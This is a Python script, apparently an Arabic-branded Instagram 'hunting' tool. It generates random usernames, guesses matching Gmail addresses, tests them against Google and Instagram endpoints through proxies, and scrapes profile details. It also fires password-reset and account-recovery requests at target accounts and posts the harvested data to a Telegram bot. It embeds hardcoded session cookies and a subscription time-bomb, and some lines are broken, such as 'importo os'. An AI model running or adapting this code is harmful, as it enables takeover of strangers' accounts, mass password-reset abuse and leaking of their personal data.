importo os
from user_agent import *
from uuid import *
from time import *
import requests , json , random , threading
from time import *
import requests,colorama,mechanize
from tokenize import cookie_re
import requests
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime

now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 4, 15, 4, 15,5)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'تم توقيف اداة ')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك ')
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')


os.system('clear')
done=0
bdins=0
bdgm=0
ID=input("ENTER ID: ")
token=input("ENTER TOKEN: ")
header={'Cookie':'mid=Yuoj_QABAAGDy60NqxnFkEK1ugGo; ig_did=73D09A01-5DEF-4825-A5FC-297629366704; ig_nrcb=1; dpr=1.75; datr=HyTqYpFIZCgFZLABtNmwFg7j; ds_user_id=54376972287; shbid="3201\05454376972287\0541691331769:01f7ecaf474c01cf2b64f89f656976d0965c8da3073154330a4900add3c619f67e943202"; shbts="1659795769\05454376972287\0541691331769:01f70263e8842a11c12dee03be01e020f555ebaa18ecb741a217c2cc23830cc4991498f9"; csrftoken=yGVOWF0iptpC69PXXdisZrltMc5Fzv5W; sessionid='}
def info(user,email):
               global bdgm , done
               url = 'https://android.clients.google.com/setup/checkavail'
               hed = {
     'Content-Length':'98',
     'Content-Type':'text/plain; charset=UTF-8',
     'Host':'android.clients.google.com',
      
     'Connection':'Keep-Alive',
      
     'user-agent':generate_user_agent()}
               data = json.dumps({
 'username':email,
 'version':'3',
 'firstName':'@H_9_8',
 'lastName':'deadcode_22'})
               prox = requests.get("https://API-PROXY.alaalight.repl.co/prox").json()["proxy"]
               res = requests.post(url,data=data,headers=hed,proxies=prox)
              
               if res.json()['status'] == 'SUCCESS':
                done+=1
                hdo = {'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
                inpho=requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hdo).json()

                bio=inpho['data']['user']['biography']
                privo=inpho['data']['user']['is_private']
                name=inpho['data']['user']['full_name']
                IDN=inpho['data']['user']['id']
                folows=inpho['data']['user']['edge_followed_by']['count']
                folow=inpho['data']['user']['edge_follow']['count']
                img1=inpho['data']['user']['profile_pic_url']
                img=requests.get(f"http://tinyurl.com/api-create.php?url={img1}").text
                rey = requests.get(f"https://o7aa.pythonanywhere.com/?id={IDN}")   
                ree = rey.json()
                date = ree['date']
                urrlr='https://www.instagram.com/accounts/account_recovery_ajax/'
                headdr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
                dataro={
							'query': f'{email}',
							        'ig_sig_key_version': '4',"user_id":IDN
						}
                rq = requests.post(urrlr,headers=headdr,data=dataro).json()
                try:
                	B19 =f"{email}"
                	fa =str(rq['options']['can_use_facebook'])
                	if fa =='True':
                		facebook = 'Linked Facebook'
                	else:
                		facebook='Not Linked '
                		ph = str(rq['options']['can_send_phone'])
                		if ph =='True':
                			numpho = ('true phone')
                		else:
                			numpho='false phone'
                except KeyError as Error:
                	L7 ='not work'
                headerros = {
        # 'Content-Length': '305',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
        # Requests sorts cookies= alphabetically

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
        # 'Accept-Encoding': 'gzip',
							}
                datada = {
        'ig_sig_key_version': '4',
        "user_id":IDN
							}
                reso = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headerros, data=datada).json()
                rest =str(reso['obfuscated_email'])
                barud=f"""
بارود جابلك حساب يطك بلكاع😂
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
يكلك تكتل اداة كتل ضيم تسوه التعب هاي ويصير عندك اخدود من تصيد اهواي😂
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
Name : {name}
UserName : @{user}
Email : {email}
ID : {IDN}
Followers : {folows}
Following : {folow}
Facebook : {facebook}
Numper Phone : {numpho}
Priv : {privo}
Data : {date}
Rest : {rest}
Bio : {bio}
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
PY// Barud !! tele // @bzubb// @w_55_5
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
ــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــــــٓــ
"""
                kok=requests.post(f'https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&photo={img}&caption={barud}')
                print(barud)
                
                print(kok)
               elif res.json()['status'] =='USERNAME_UNAVAILABLE':
                bdgm+=1
                os.system('clear')
                print(f'''ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n \033[1;31m \n - Bad insta gmail  >>  {bdgm}\n\033[1;32m -Done insta gmail >> {done} \n\033[1;33m -Ckeck email >> {email}\n \n \033[1;34mᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n   \033[1;35mPY// BARUD \n \033[1;36mTelle// @BZUBB-- @w_55_5 \n\033[1;37m ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ''')

def check(email,user):
              global done,bdins,bdgm
              url='https://i.instagram.com/api/v1/accounts/login/'
              heard = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
              ata = {
              'uuid':uuid4(),
              'password':'@H_9_8',
              'username':email,
              'device_id':uuid4(),
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
              os.system('clear')
              print(f'''ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n \033[1;31m \n - Bad insta gmail  >>  {bdgm}\n\033[1;32m -Done insta gmail >> {done} \n\033[1;33m -Ckeck email >> {email}\n \n \033[1;34mᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n   \033[1;35mPY// BARUD \n \033[1;36mTelle// @BZUBB-- @w_55_5 \n\033[1;37m ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ''')
              bdgm+=1
              os.system('clear')
              print(f'''ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n \033[1;31m \n - Bad insta gmail  >>  {bdgm}\n\033[1;32m -Done insta gmail >> {done} \n\033[1;33m -Ckeck email >> {email}\n \n \033[1;34mᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ\n   \033[1;35mPY// BARUD \n \033[1;36mTelle// @BZUBB-- @w_55_5 \n\033[1;37m ᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐᏐ''')
def grenated():
 global done,bdins,bdgm
 while True:
  bb="qwertyuioplkjhgfdsazxcvbnm0987654321"
  name = str(''.join(random.choice(bb)for i in range(7))).lower()
  ch=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
  if "users" in ch.text:
   
   for i in ch.json()["users"]:
    
    user=(i['user']['username'])
    em = user
     
    email = em+"@gmail.com"
    check(email,user)
  else:
   
     grenated()
Threads=[] 
for t in range(7):
	x = threading.Thread(target=grenated)
	x.start()
	Threads.append(x)
for Th in Threads:
	Th.join()
grenated()
